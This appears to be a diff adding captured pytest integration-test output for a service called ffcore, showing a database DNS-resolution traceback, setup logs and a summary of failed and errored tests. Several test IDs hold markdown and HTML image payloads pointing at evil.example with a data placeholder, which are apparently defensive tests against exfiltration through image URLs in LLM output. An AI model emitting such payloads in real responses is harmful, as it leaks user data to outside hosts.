+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:49:51,976 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-05 01:49:52,325 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-05 01:49:52,779 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=449
+2026-11-05 01:49:52,830 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-05 01:49:52,905 INFO ffcore.access access method=POST path=/api/v1/projects/b95c19bd-4b2c-4188-91c0-797a92143c0b/api-keys status=201 ms=119
+------------------------------ Captured log setup ------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=2 updated=0 deleted=0 problems=0
+ERROR    ffcore.readiness:readiness.py:63 warmup failed: ModelMissing
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=449
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=0
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/projects/b95c19bd-4b2c-4188-91c0-797a92143c0b/api-keys status=201 ms=119
+ERROR    ffcore.readiness:readiness.py:63 warmup failed: ModelMissing
+----------------------------- Captured stderr call -----------------------------
+2026-11-05 01:49:53,038 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-05 01:49:53,523 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-05 01:49:53,849 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-05 01:49:53,852 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-05 01:50:04,533 INFO ffcore.access access method=POST path=/v1/chat/completions status=500 ms=11479
+------------------------------ Captured log call -------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=0
+WARNING  langfuse:client.py:1399 Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+WARNING  langfuse:client.py:1399 Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+INFO     ffcore.access:logging.py:263 access method=POST path=/v1/chat/completions status=500 ms=11479
+=============================== warnings summary ===============================
+tests/integration/test_04a_worker.py::test_04a_upload_job_runs_in_worker
+tests/integration/test_04a_worker.py::test_04a_job_for_missing_row_retries_then_fails_loud
+  /opt/venv/lib/python3.12/site-packages/arq/worker.py:877: DeprecationWarning: Call to deprecated close. (Use aclose() instead) -- Deprecated since version 5.0.1.
+    await self.pool.close(close_connection_pool=True)
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED tests/integration/test_03a_providers.py::test_03a_9_unresolvable_host_is_a_failed_test
+FAILED tests/integration/test_08t_m1_counter.py::test_08t_m1_reserve_moves_the_counter_past_carried_numbers
+FAILED tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src="https://evil.example/a b?q= {v}">]
+ERROR tests/integration/test_08t_22_attachment_names.py::test_08t_22_prsim_attachment_is_ek_n
+ERROR tests/integration/test_08t_m7_blocked_deleted.py::test_08t_m7_blocked_source_masked_on_db_replay
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x]( //evil.example/p?q={v})]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x](<https://evil.example/a b?q= {v}>)]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src=//evil.example/?q={v}>]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src\n=\n"http:evil.example/?q={v}">]
+ERROR tests/integration/test_116_checkpoint_sources.py::test_116_3_resume_after_document_delete_fails_loud
+ERROR tests/integration/test_116_checkpoint_sources.py::test_116_4_sweep_closes_waiting_user_run_with_deleted_source
+ERROR tests/integration/test_116_checkpoint_sources.py::test_116_5_sweep_purges_threads_of_runs_ended_outside_the_runner
+ERROR tests/integration/test_116_checkpoint_sources.py::test_116_6_resume_with_live_source_completes
+ERROR tests/integration/test_116_checkpoint_sources.py::test_116_12_sweep_isolates_a_failing_close
+ERROR tests/integration/test_134_egress_real_engine.py::test_134_llmaas_every_message_tokenized_and_idempotent
+ERROR tests/integration/test_18td_tools_api.py::test_18td_11_invoke_reaches_the_desk_without_identity
+ERROR tests/integration/test_19_ingest_raw.py::test_19_1_ingest_raw_paycore_like_idempotent
+ERROR tests/integration/test_19_ingest_raw.py::test_19_s1_pii_masked_in_silver_text_raw_and_chunks
+ERROR tests/integration/test_19_ingest_raw.py::test_19_1_limit_first_slice - ...
+SKIPPED [1] tests/integration/test_03b_egress_dns.py: NOT_RUN: needs RUN_DNS_TESTS=1
+SKIPPED [1] tests/integration/test_04a_ingest.py:124: NOT_RUN: needs RUN_MODEL_TESTS=1
+SKIPPED [1] tests/integration/test_04a_ingest.py:279: NOT_RUN: needs RUN_MODEL_TESTS=1
+SKIPPED [1] tests/integration/test_05a_sql.py:288: NOT_RUN: needs RUN_MODEL_TESTS=1
+SKIPPED [1] tests/integration/test_19_ingest_raw.py:157: root ignores file modes; the mount test runs :ro
+3 failed, 847 passed, 5 skipped, 2 warnings, 16 errors in 1530.25s (0:25:30)
+test-int exit=1
